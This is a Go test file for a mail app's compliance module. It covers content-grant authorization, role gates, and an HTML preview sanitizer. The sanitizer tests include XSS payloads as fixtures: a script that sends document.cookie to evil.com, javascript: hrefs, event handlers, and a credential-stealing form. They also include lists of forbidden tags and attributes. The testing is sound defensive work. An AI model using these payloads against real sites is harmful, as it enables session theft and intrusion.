package compliance_test

import (
	"errors"
	"strings"
	"testing"
	"time"

	"golang.org/x/net/html"

	"github.com/bushixiucai/urmail/internal/domain/compliance"
)

func TestAuthorizeContentAccess(t *testing.T) {
	now := time.Date(2026, 10, 23, 15, 0, 0, 0, time.UTC)
	future := now.Add(24 * time.Hour)
	past := now.Add(-24 * time.Hour)

	t.Run("nil grant rejected", func(t *testing.T) {
		err := compliance.AuthorizeContentAccess(nil, compliance.ScopeMetadataOnly, now)
		if !errors.Is(err, compliance.ErrNoGrant) {
			t.Errorf("expected ErrNoGrant, got %v", err)
		}
	})

	t.Run("revoked grant rejected", func(t *testing.T) {
		g := &compliance.ContentGrant{Revoked: true}
		err := compliance.AuthorizeContentAccess(g, compliance.ScopeMetadataOnly, now)
		if !errors.Is(err, compliance.ErrGrantRevoked) {
			t.Errorf("expected ErrGrantRevoked, got %v", err)
		}
	})

	t.Run("expired grant rejected", func(t *testing.T) {
		g := &compliance.ContentGrant{ExpiresAt: &past}
		err := compliance.AuthorizeContentAccess(g, compliance.ScopeMetadataOnly, now)
		if !errors.Is(err, compliance.ErrGrantExpired) {
			t.Errorf("expected ErrGrantExpired, got %v", err)
		}
	})

	t.Run("metadata only cannot access full content", func(t *testing.T) {
		g := &compliance.ContentGrant{Scope: compliance.ScopeMetadataOnly, ExpiresAt: &future}
		err := compliance.AuthorizeContentAccess(g, compliance.ScopeFullContent, now)
		if !errors.Is(err, compliance.ErrInsufficientScope) {
			t.Errorf("expected ErrInsufficientScope, got %v", err)
		}
	})

	t.Run("full content can access full content and metadata", func(t *testing.T) {
		g := &compliance.ContentGrant{Scope: compliance.ScopeFullContent, ExpiresAt: &future, GrantedBy: 1, Reason: "test access", OwnerConfirmedAt: &now}
		if err := compliance.AuthorizeContentAccess(g, compliance.ScopeFullContent, now); err != nil {
			t.Errorf("expected allowed full content, got %v", err)
		}
		if err := compliance.AuthorizeContentAccess(g, compliance.ScopeMetadataOnly, now); err != nil {
			t.Errorf("expected allowed metadata, got %v", err)
		}
		if err := compliance.AuthorizeContentAccess(g, compliance.ScopeExport, now); !errors.Is(err, compliance.ErrInsufficientScope) {
			t.Errorf("expected ErrInsufficientScope for export, got %v", err)
		}
	})

	t.Run("export cannot access content without separate scope", func(t *testing.T) {
		g := &compliance.ContentGrant{Scope: compliance.ScopeExport, ExpiresAt: &future, GrantedBy: 1, Reason: "test export", OwnerConfirmedAt: &now}
		if err := compliance.AuthorizeContentAccess(g, compliance.ScopeExport, now); err != nil {
			t.Errorf("expected allowed export, got %v", err)
		}
		if err := compliance.AuthorizeContentAccess(g, compliance.ScopeFullContent, now); !errors.Is(err, compliance.ErrInsufficientScope) {
			t.Errorf("export must not imply content permission: %v", err)
		}
	})
}

// TestContentGrantRevokeRecordsProvenance covers the additive provenance
// fields: a revoked grant must say who revoked it and when.
func TestContentGrantRevokeRecordsProvenance(t *testing.T) {
	now := time.Date(2026, 10, 23, 15, 0, 0, 0, time.UTC)

	t.Run("revoke records actor and time", func(t *testing.T) {
		g := &compliance.ContentGrant{UserID: 7, GrantedBy: 3, Scope: compliance.ScopeExport}
		if g.RevokedBy != nil || g.RevokedAt != nil {
			t.Fatalf("a live grant must not carry revocation data")
		}
		g.Revoke(42, now)
		if !g.Revoked {
			t.Errorf("expected Revoked to be true")
		}
		if g.RevokedBy == nil || *g.RevokedBy != 42 {
			t.Errorf("expected RevokedBy=42, got %v", g.RevokedBy)
		}
		if g.RevokedAt == nil || !g.RevokedAt.Equal(now) {
			t.Errorf("expected RevokedAt=%v, got %v", now, g.RevokedAt)
		}
		if g.GrantedBy != 3 {
			t.Errorf("expected GrantedBy to stay 3, got %d", g.GrantedBy)
		}
	})

	t.Run("revoke without time still stamps a timestamp", func(t *testing.T) {
		g := &compliance.ContentGrant{}
		g.Revoke(9, time.Time{})
		if g.RevokedAt == nil || g.RevokedAt.IsZero() {
			t.Errorf("expected a non-zero RevokedAt, got %v", g.RevokedAt)
		}
	})

	t.Run("revoked grant is still rejected", func(t *testing.T) {
		g := &compliance.ContentGrant{Scope: compliance.ScopeExport}
		g.Revoke(42, now)
		err := compliance.AuthorizeContentAccess(g, compliance.ScopeExport, now)
		if !errors.Is(err, compliance.ErrGrantRevoked) {
			t.Errorf("expected ErrGrantRevoked, got %v", err)
		}
	})
}

// TestRoleMayHoldScope covers the role gate table: only an owner or an admin
// may hold, read or exercise a content or export grant.
func TestRoleMayHoldScope(t *testing.T) {
	cases := []struct {
		role  string
		scope string
		want  bool
	}{
		{compliance.TenantRoleOwner, compliance.ScopeExport, true},
		{compliance.TenantRoleOwner, compliance.ScopeFullContent, true},
		{compliance.TenantRoleOwner, compliance.ScopeMetadataOnly, true},
		{compliance.TenantRoleAdmin, compliance.ScopeExport, true},
		{compliance.TenantRoleAdmin, compliance.ScopeFullContent, true},
		{compliance.TenantRoleAdmin, compliance.ScopeMetadataOnly, true},
		{compliance.TenantRoleBilling, compliance.ScopeExport, false},
		{compliance.TenantRoleBilling, compliance.ScopeFullContent, false},
		{compliance.TenantRoleBilling, compliance.ScopeMetadataOnly, true},
		{compliance.TenantRoleMember, compliance.ScopeExport, false},
		{compliance.TenantRoleMember, compliance.ScopeFullContent, false},
		{compliance.TenantRoleMember, compliance.ScopeMetadataOnly, true},
		{"", compliance.ScopeExport, false},
		{"", compliance.ScopeMetadataOnly, false},
		{"superuser", compliance.ScopeExport, false},
		{compliance.TenantRoleOwner, "everything", false},
	}
	for _, tc := range cases {
		if got := compliance.RoleMayHoldScope(tc.role, tc.scope); got != tc.want {
			t.Errorf("RoleMayHoldScope(%q, %q) = %v, want %v", tc.role, tc.scope, got, tc.want)
		}
	}
}

// TestAuthorizeContentAccessWithRole covers the explicit role gate that
// tenant-facing handlers must apply on top of the grant checks.
func TestAuthorizeContentAccessWithRole(t *testing.T) {
	now := time.Date(2026, 10, 23, 15, 0, 0, 0, time.UTC)
	future := now.Add(24 * time.Hour)
	past := now.Add(-24 * time.Hour)

	exportGrant := &compliance.ContentGrant{Scope: compliance.ScopeExport, ExpiresAt: &future, GrantedBy: 1, Reason: "test export", OwnerConfirmedAt: &now}
	contentGrant := &compliance.ContentGrant{Scope: compliance.ScopeFullContent, ExpiresAt: &future, GrantedBy: 1, Reason: "test content", OwnerConfirmedAt: &now}
	metadataGrant := &compliance.ContentGrant{Scope: compliance.ScopeMetadataOnly, ExpiresAt: &future, GrantedBy: 1}

	t.Run("owner may export", func(t *testing.T) {
		if err := compliance.AuthorizeContentAccessWithRole(exportGrant, compliance.ScopeExport, compliance.TenantRoleOwner, now); err != nil {
			t.Errorf("expected owner to be allowed to export, got %v", err)
		}
	})

	t.Run("admin may export", func(t *testing.T) {
		if err := compliance.AuthorizeContentAccessWithRole(exportGrant, compliance.ScopeExport, compliance.TenantRoleAdmin, now); err != nil {
			t.Errorf("expected admin to be allowed to export, got %v", err)
		}
	})

	t.Run("member may not exercise an export grant", func(t *testing.T) {
		err := compliance.AuthorizeContentAccessWithRole(exportGrant, compliance.ScopeExport, compliance.TenantRoleMember, now)
		if !errors.Is(err, compliance.ErrRoleNotPermitted) {
			t.Errorf("expected ErrRoleNotPermitted, got %v", err)
		}
	})

	t.Run("member may not exercise a full content grant", func(t *testing.T) {
		err := compliance.AuthorizeContentAccessWithRole(contentGrant, compliance.ScopeFullContent, compliance.TenantRoleMember, now)
		if !errors.Is(err, compliance.ErrRoleNotPermitted) {
			t.Errorf("expected ErrRoleNotPermitted, got %v", err)
		}
	})

	t.Run("member may not read content through an export grant", func(t *testing.T) {
		err := compliance.AuthorizeContentAccessWithRole(exportGrant, compliance.ScopeFullContent, compliance.TenantRoleMember, now)
		if !errors.Is(err, compliance.ErrRoleNotPermitted) {
			t.Errorf("expected ErrRoleNotPermitted, got %v", err)
		}
	})

	t.Run("billing may not exercise an export grant", func(t *testing.T) {
		err := compliance.AuthorizeContentAccessWithRole(exportGrant, compliance.ScopeExport, compliance.TenantRoleBilling, now)
		if !errors.Is(err, compliance.ErrRoleNotPermitted) {
			t.Errorf("expected ErrRoleNotPermitted, got %v", err)
		}
	})

	t.Run("member may exercise a metadata only grant", func(t *testing.T) {
		if err := compliance.AuthorizeContentAccessWithRole(metadataGrant, compliance.ScopeMetadataOnly, compliance.TenantRoleMember, now); err != nil {
			t.Errorf("expected member to be allowed metadata access, got %v", err)
		}
	})

	t.Run("unknown role is denied", func(t *testing.T) {
		err := compliance.AuthorizeContentAccessWithRole(exportGrant, compliance.ScopeExport, "root", now)
		if !errors.Is(err, compliance.ErrRoleNotPermitted) {
			t.Errorf("expected ErrRoleNotPermitted, got %v", err)
		}
	})

	t.Run("grant checks still run first", func(t *testing.T) {
		revoked := &compliance.ContentGrant{Scope: compliance.ScopeExport}
		revoked.Revoke(5, now)
		err := compliance.AuthorizeContentAccessWithRole(revoked, compliance.ScopeExport, compliance.TenantRoleMember, now)
		if !errors.Is(err, compliance.ErrGrantRevoked) {
			t.Errorf("expected ErrGrantRevoked, got %v", err)
		}

		expired := &compliance.ContentGrant{Scope: compliance.ScopeExport, ExpiresAt: &past}
		err = compliance.AuthorizeContentAccessWithRole(expired, compliance.ScopeExport, compliance.TenantRoleMember, now)
		if !errors.Is(err, compliance.ErrGrantExpired) {
			t.Errorf("expected ErrGrantExpired, got %v", err)
		}

		err = compliance.AuthorizeContentAccessWithRole(nil, compliance.ScopeExport, compliance.TenantRoleOwner, now)
		if !errors.Is(err, compliance.ErrNoGrant) {
			t.Errorf("expected ErrNoGrant, got %v", err)
		}
	})

	t.Run("scope check still applies", func(t *testing.T) {
		err := compliance.AuthorizeContentAccessWithRole(metadataGrant, compliance.ScopeExport, compliance.TenantRoleOwner, now)
		if !errors.Is(err, compliance.ErrInsufficientScope) {
			t.Errorf("expected ErrInsufficientScope, got %v", err)
		}
	})
}

// TestAuthorizeGrantIssuance covers the other half of the role gate: who may
// issue a content grant in the first place.
func TestAuthorizeGrantIssuance(t *testing.T) {
	cases := []struct {
		role  string
		scope string
		want  error
	}{
		{compliance.TenantRoleOwner, compliance.ScopeExport, nil},
		{compliance.TenantRoleAdmin, compliance.ScopeExport, compliance.ErrRoleNotPermitted},
		{compliance.TenantRoleOwner, compliance.ScopeFullContent, nil},
		{compliance.TenantRoleMember, compliance.ScopeExport, compliance.ErrRoleNotPermitted},
		{compliance.TenantRoleMember, compliance.ScopeFullContent, compliance.ErrRoleNotPermitted},
		{compliance.TenantRoleBilling, compliance.ScopeFullContent, compliance.ErrRoleNotPermitted},
		{compliance.TenantRoleMember, compliance.ScopeMetadataOnly, compliance.ErrRoleNotPermitted},
		{"", compliance.ScopeMetadataOnly, compliance.ErrRoleNotPermitted},
	}
	for _, tc := range cases {
		err := compliance.AuthorizeGrantIssuance(tc.role, tc.scope)
		if tc.want == nil {
			if err != nil {
				t.Errorf("AuthorizeGrantIssuance(%q, %q) = %v, want nil", tc.role, tc.scope, err)
			}
			continue
		}
		if !errors.Is(err, tc.want) {
			t.Errorf("AuthorizeGrantIssuance(%q, %q) = %v, want %v", tc.role, tc.scope, err, tc.want)
		}
	}
}

func TestSanitizeHTMLPreview(t *testing.T) {
	raw := `
		<div>
			<p>Hello, please review this statement.</p>
			<script>window.location='http://evil.com/leak?cookie='+document.cookie;</script>
			<iframe src="http://evil.com/phish"></iframe>
			<img src="https://tracker.evil.com/beacon.gif" alt="tracking" onerror="alert(1)" />
			<a href="https://example.com" onclick="steal()">Click here</a>
		</div>
	`

	clean, blocked := compliance.SanitizeHTMLPreview(raw)

	if strings.Contains(clean, "<script") {
		t.Errorf("script tag not stripped: %s", clean)
	}
	if strings.Contains(clean, "<iframe") {
		t.Errorf("iframe tag not stripped: %s", clean)
	}
	if strings.Contains(clean, "onerror") || strings.Contains(clean, "onclick") {
		t.Errorf("event handlers not stripped: %s", clean)
	}
	if strings.Contains(clean, ` src="https://tracker.evil.com`) {
		t.Errorf("remote tracker img src not neutralized: %s", clean)
	}
	if !strings.Contains(clean, `data-blocked-src="https://tracker.evil.com/beacon.gif"`) {
		t.Errorf("missing data-blocked-src attribute: %s", clean)
	}
	// img src neutralized + onerror and onclick attributes dropped = 3.
	if blocked != 3 {
		t.Errorf("expected 3 blocked resources, got %d", blocked)
	}
}

func TestSanitizeHTMLPreviewBypasses(t *testing.T) {
	cases := []struct {
		name   string
		raw    string
		forbid []string
	}{
		{
			name:   "nested script tag confusion",
			raw:    `<scr<script>ipt>alert(1)</scr</script>ipt><script>alert(2)</script>`,
			forbid: []string{"<script"},
		},
		{
			name:   "javascript href",
			raw:    `<a href="javascript:alert(1)">x</a><a href="JaVaScRiPt:alert(2)">y</a>`,
			forbid: []string{"javascript:", "javasc ript"},
		},
		{
			name:   "tab-obfuscated javascript scheme",
			raw:    "<a href=\"java\tscript:alert(1)\">x</a>",
			forbid: []string{"script:"},
		},
		{
			name:   "data href and src",
			raw:    `<a href="data:text/html,<b>hi</b>">x</a><img src="data:image/svg+xml;base64,AAAA">`,
			forbid: []string{"data:text/html", "data:image/svg+xml;base64"},
		},
		{
			name:   "onerror handler",
			raw:    `<img src="https://example.com/a.png" onerror="alert(1)">`,
			forbid: []string{"onerror"},
		},
		{
			name:   "unpaired closing tags",
			raw:    `</p></script></div>plain text`,
			forbid: []string{"<script"},
		},
		{
			name:   "nested style content dropped",
			raw:    `<style>p { background: url(javascript:alert(1)) }</style><p>ok</p>`,
			forbid: []string{"<style", "javascript:", "background"},
		},
		{
			name:   "srcset attribute dropped",
			raw:    `<img srcset="https://evil.com/1x 1x" src="https://example.com/a.png">`,
			forbid: []string{"srcset"},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			clean, _ := compliance.SanitizeHTMLPreview(tc.raw)
			for _, f := range tc.forbid {
				if strings.Contains(strings.ToLower(clean), strings.ToLower(f)) {
					t.Errorf("output contains forbidden %q: %s", f, clean)
				}
			}
		})
	}
}

func TestSanitizeHTMLPreviewKeepsSafeMarkup(t *testing.T) {
	raw := `<p>Hello <strong>world</strong></p><ul><li>a</li></ul><table><tr><td>cell</td></tr></table><a href="https://example.com">link</a>`
	clean, blocked := compliance.SanitizeHTMLPreview(raw)
	for _, want := range []string{"<p>Hello <strong>world</strong></p>", "<ul><li>a</li></ul>", "<table><tbody><tr><td>cell</td></tr></tbody></table>", `href="https://example.com"`} {
		if !strings.Contains(clean, want) {
			t.Errorf("output missing %q: %s", want, clean)
		}
	}
	if blocked != 0 {
		t.Errorf("expected 0 blocked, got %d", blocked)
	}
}

// TestSanitizeHTMLPreviewForcesNoopenerOnBlankTarget covers reverse
// tabnabbing: an anchor that opens a new browsing context must always carry
// rel="noopener noreferrer", so the opened page cannot reach back into the
// preview through window.opener.
func TestSanitizeHTMLPreviewForcesNoopenerOnBlankTarget(t *testing.T) {
	cases := []struct {
		name      string
		raw       string
		wantRel   []string
		wantAttrs bool
	}{
		{
			name:      "target blank without rel",
			raw:       `<a href="https://example.com" target="_blank">x</a>`,
			wantRel:   []string{"noopener", "noreferrer"},
			wantAttrs: true,
		},
		{
			name:      "target blank keeps author rel tokens",
			raw:       `<a href="https://example.com" target="_blank" rel="nofollow">x</a>`,
			wantRel:   []string{"nofollow", "noopener", "noreferrer"},
			wantAttrs: true,
		},
		{
			name:      "target blank with partial rel",
			raw:       `<a href="https://example.com" rel="noopener" target="_blank">x</a>`,
			wantRel:   []string{"noopener", "noreferrer"},
			wantAttrs: true,
		},
		{
			name:      "target blank with noreferrer only",
			raw:       `<a href="https://example.com" rel="noreferrer" target="_blank">x</a>`,
			wantRel:   []string{"noopener", "noreferrer"},
			wantAttrs: true,
		},
		{
			name:      "target blank with contradictory opener",
			raw:       `<a href="https://example.com" rel="opener" target="_blank">x</a>`,
			wantRel:   []string{"noopener", "noreferrer"},
			wantAttrs: true,
		},
		{
			name:      "uppercase target",
			raw:       `<a href="https://example.com" target="_BLANK">x</a>`,
			wantRel:   []string{"noopener", "noreferrer"},
			wantAttrs: true,
		},
		{
			name:      "padded target",
			raw:       `<a href="https://example.com" target=" _blank ">x</a>`,
			wantRel:   []string{"noopener", "noreferrer"},
			wantAttrs: true,
		},
		{
			name:      "same window target keeps no rel",
			raw:       `<a href="https://example.com" target="_self">x</a>`,
			wantAttrs: false,
		},
		{
			name:      "no target keeps no rel",
			raw:       `<a href="https://example.com">x</a>`,
			wantAttrs: false,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			clean, blocked := compliance.SanitizeHTMLPreview(tc.raw)
			rel, found := firstAnchorRel(t, clean)
			if tc.wantAttrs && !found {
				t.Fatalf("expected a rel attribute on the anchor: %s", clean)
			}
			if !tc.wantAttrs && found {
				t.Errorf("expected no rel attribute on the anchor, got %q: %s", rel, clean)
			}
			tokens := map[string]bool{}
			for _, tok := range strings.Fields(rel) {
				tokens[strings.ToLower(tok)] = true
			}
			for _, want := range tc.wantRel {
				if !tokens[want] {
					t.Errorf("expected rel to contain %q, got %q: %s", want, rel, clean)
				}
			}
			// Hardening must not be reported as a blocked resource.
			if blocked != 0 {
				t.Errorf("expected 0 blocked, got %d: %s", blocked, clean)
			}
		})
	}
}

// TestSanitizeHTMLPreviewRefusesOversizedInput covers the input size bound.
func TestSanitizeHTMLPreviewRefusesOversizedInput(t *testing.T) {
	raw := "<p>" + strings.Repeat("a", compliance.MaxHTMLPreviewInputBytes) + "</p>"
	clean, blocked := compliance.SanitizeHTMLPreview(raw)
	if !compliance.HTMLPreviewRefused(clean) {
		t.Fatalf("expected the preview to be refused, got %d bytes of output", len(clean))
	}
	if clean != compliance.HTMLPreviewUnavailableNotice {
		t.Errorf("expected the refusal notice, got %q", clean)
	}
	if blocked == 0 {
		t.Errorf("expected a non-zero blocked count on refusal, got %d", blocked)
	}
	if strings.Contains(clean, "aaaa") {
		t.Errorf("the refused preview must not echo the oversized payload")
	}
}

// TestSanitizeHTMLPreviewAcceptsInputAtLimit proves the bound is inclusive:
// a document of exactly the maximum size is still previewed.
func TestSanitizeHTMLPreviewAcceptsInputAtLimit(t *testing.T) {
	raw := strings.Repeat("a", compliance.MaxHTMLPreviewInputBytes)
	clean, blocked := compliance.SanitizeHTMLPreview(raw)
	if compliance.HTMLPreviewRefused(clean) {
		t.Fatalf("input of exactly %d bytes must be accepted", compliance.MaxHTMLPreviewInputBytes)
	}
	if blocked != 0 {
		t.Errorf("expected 0 blocked, got %d", blocked)
	}
}

// TestSanitizeHTMLPreviewRefusesDeepNesting covers the nesting depth bound.
func TestSanitizeHTMLPreviewRefusesDeepNesting(t *testing.T) {
	depth := compliance.MaxHTMLPreviewDepth + 50
	raw := strings.Repeat("<div>", depth) + "x" + strings.Repeat("</div>", depth)
	clean, blocked := compliance.SanitizeHTMLPreview(raw)
	if !compliance.HTMLPreviewRefused(clean) {
		t.Fatalf("expected the preview to be refused for %d nested elements", depth)
	}
	if clean != compliance.HTMLPreviewUnavailableNotice {
		t.Errorf("expected the refusal notice, got %q", clean)
	}
	if blocked == 0 {
		t.Errorf("expected a non-zero blocked count on refusal, got %d", blocked)
	}
	if strings.Contains(clean, "<div>") {
		t.Errorf("the refused preview must not contain a truncated document")
	}
}

// TestSanitizeHTMLPreviewAcceptsReasonableNesting proves the depth bound does
// not reject ordinary documents.
func TestSanitizeHTMLPreviewAcceptsReasonableNesting(t *testing.T) {
	const depth = 10
	raw := strings.Repeat("<div>", depth) + "x" + strings.Repeat("</div>", depth)
	clean, _ := compliance.SanitizeHTMLPreview(raw)
	if compliance.HTMLPreviewRefused(clean) {
		t.Fatalf("%d nested elements must be accepted", depth)
	}
	if !strings.Contains(clean, "<div>") {
		t.Errorf("expected the nested markup to survive: %s", clean)
	}
}

// TestSanitizeHTMLPreviewCannotIntroduceActiveContent is the regression test
// for the four constructs that must never survive sanitization: a base tag, a
// meta http-equiv=refresh, a form carrying a formaction, and an inline event
// handler.
func TestSanitizeHTMLPreviewCannotIntroduceActiveContent(t *testing.T) {
	cases := []struct {
		name   string
		raw    string
		forbid []string
	}{
		{
			name:   "base tag",
			raw:    `<base href="https://evil.com/"><p>body</p>`,
			forbid: []string{"<base", "evil.com"},
		},
		{
			name:   "base tag in body",
			raw:    `<p>body</p><base href="https://evil.com/">`,
			forbid: []string{"<base", "evil.com"},
		},
		{
			name:   "meta http-equiv refresh",
			raw:    `<meta http-equiv="refresh" content="0;url=https://evil.com/"><p>body</p>`,
			forbid: []string{"<meta", "http-equiv", "refresh", "evil.com"},
		},
		{
			name:   "meta http-equiv refresh in body",
			raw:    `<p>body</p><meta http-equiv="refresh" content="0;url=https://evil.com/">`,
			forbid: []string{"<meta", "http-equiv", "refresh", "evil.com"},
		},
		{
			name:   "form with formaction",
			raw:    `<form action="https://evil.com/steal" method="post"><input name="pw" formaction="https://evil.com/steal"><button formaction="https://evil.com/steal">go</button></form>`,
			forbid: []string{"<form", "formaction", "evil.com", "<input", "<button"},
		},
		{
			name:   "inline event handlers",
			raw:    `<p onclick="steal()" onmouseover="steal()">text</p><img src="https://example.com/a.png" onerror="alert(1)">`,
			forbid: []string{"onclick", "onmouseover", "onerror", "alert(", "steal("},
		},
		{
			name:   "svg onload and body onload",
			raw:    `<svg onload="alert(1)"><body onload="alert(2)"><p>x</p>`,
			forbid: []string{"<svg", "<body", "onload", "alert("},
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			clean, _ := compliance.SanitizeHTMLPreview(tc.raw)
			lower := strings.ToLower(clean)
			for _, f := range tc.forbid {
				if strings.Contains(lower, strings.ToLower(f)) {
					t.Errorf("output contains forbidden %q: %s", f, clean)
				}
			}
			assertNoActiveContent(t, clean)
		})
	}
}

// assertNoActiveContent re-parses the sanitized output and fails if any active
// content survived: a base tag, a meta refresh, a form (or formaction) or an
// inline event handler.
func assertNoActiveContent(t *testing.T, clean string) {
	t.Helper()
	doc, err := html.Parse(strings.NewReader(clean))
	if err != nil {
		t.Fatalf("re-parse sanitized output: %v", err)
	}
	forbiddenTags := map[string]bool{
		"base": true, "meta": true, "form": true, "input": true, "button": true,
		"script": true, "style": true, "iframe": true, "object": true, "embed": true,
		"svg": true, "math": true, "template": true, "noscript": true, "link": true,
		"applet": true, "frame": true, "frameset": true,
	}
	forbiddenAttrs := map[string]bool{
		"formaction": true, "action": true, "http-equiv": true, "srcdoc": true,
		"srcset": true, "ping": true, "background": true, "dynsrc": true, "lowsrc": true,
	}
	var walk func(n *html.Node)
	walk = func(n *html.Node) {
		if n.Type == html.ElementNode {
			tag := strings.ToLower(n.Data)
			if forbiddenTags[tag] {
				t.Errorf("sanitized output still contains <%s>: %s", tag, clean)
			}
			for _, a := range n.Attr {
				key := strings.ToLower(a.Key)
				if strings.HasPrefix(key, "on") {
					t.Errorf("sanitized output still contains event handler %q: %s", key, clean)
				}
				if forbiddenAttrs[key] {
					t.Errorf("sanitized output still contains attribute %q: %s", key, clean)
				}
			}
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			walk(c)
		}
	}
	walk(doc)
}

// firstAnchorRel returns the rel attribute of the first anchor of the
// sanitized output.
func firstAnchorRel(t *testing.T, clean string) (string, bool) {
	t.Helper()
	doc, err := html.Parse(strings.NewReader(clean))
	if err != nil {
		t.Fatalf("parse sanitized output: %v", err)
	}
	var rel string
	found := false
	var walk func(n *html.Node)
	walk = func(n *html.Node) {
		if n.Type == html.ElementNode && strings.ToLower(n.Data) == "a" && !found {
			for _, a := range n.Attr {
				if strings.ToLower(a.Key) == "rel" {
					rel = a.Val
					found = true
				}
			}
		}
		for c := n.FirstChild; c != nil; c = c.NextSibling {
			walk(c)
		}
	}
	walk(doc)
	return rel, found
}

func TestContentGrantsRequireOwnerConfirmationAndIndependentScopes(t *testing.T) {
	now := time.Date(2026, 10, 24, 0, 0, 0, 0, time.UTC)
	future := now.Add(time.Hour)
	grant := &compliance.ContentGrant{Scope: compliance.ScopeFullContent, ExpiresAt: &future, GrantedBy: 1, Reason: "incident review", OwnerConfirmedAt: &now}
	if err := compliance.AuthorizeContentAccess(grant, compliance.ScopeFullContent, now); err != nil {
		t.Fatal(err)
	}
	for _, mutate := range []func(*compliance.ContentGrant){
		func(g *compliance.ContentGrant) { g.OwnerConfirmedAt = nil },
		func(g *compliance.ContentGrant) { g.GrantedBy = 0 },
		func(g *compliance.ContentGrant) { g.Reason = " " },
		func(g *compliance.ContentGrant) { g.ExpiresAt = nil },
	} {
		candidate := *grant
		mutate(&candidate)
		if err := compliance.AuthorizeContentAccess(&candidate, compliance.ScopeFullContent, now); !errors.Is(err, compliance.ErrGrantUnconfirmed) {
			t.Fatalf("unconfirmed grant allowed: %v", err)
		}
	}
	grant.Scope = compliance.ScopeExport
	if err := compliance.AuthorizeContentAccess(grant, compliance.ScopeFullContent, now); !errors.Is(err, compliance.ErrInsufficientScope) {
		t.Fatalf("export implied preview: %v", err)
	}
	grant.ExpiresAt = &now
	if err := compliance.AuthorizeContentAccess(grant, compliance.ScopeExport, now); !errors.Is(err, compliance.ErrGrantExpired) {
		t.Fatalf("expiry boundary allowed: %v", err)
	}
}
